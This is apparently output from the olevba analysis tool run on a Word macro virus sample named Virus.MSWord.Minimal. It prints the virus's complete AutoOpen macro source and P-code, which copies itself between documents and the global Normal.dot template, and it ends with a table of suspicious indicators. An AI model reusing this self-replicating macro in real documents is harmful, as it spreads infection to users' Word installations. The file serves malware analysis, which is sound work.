olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.as
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.as - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Minimal.as - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN()
Dim F$
Dim M$
On Error GoTo -1: On Error GoTo MinSize
F$ = WordBasic.[FileName$]() + ":AutoOpen"
M$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
If M$ = "NORMAL.DOT" Then
WordBasic.MacroCopy "Global:AutoOpen", F$
WordBasic.FileSaveAs Format:=1
Else
WordBasic.MacroCopy F$, "Global:AutoOpen"
End If
MinSize:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Minimal.as
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 1485 bytes
' Line #0:
' 	FuncDefn (Public Sub MAIN())
' Line #1:
' 	Dim 
' 	VarDefn False
' Line #2:
' 	Dim 
' 	VarDefn M
' Line #3:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError MinSize 
' Line #4:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St False$ 
' Line #5:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroFileName$] 0x0001 
' 	LitDI2 0x000A 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St M$ 
' Line #6:
' 	Ld M$ 
' 	LitStr 0x000A "NORMAL.DOT"
' 	Eq 
' 	IfBlock 
' Line #7:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld False$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #8:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #9:
' 	ElseBlock 
' Line #10:
' 	Ld False$ 
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	Label MinSize 
' Line #13:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

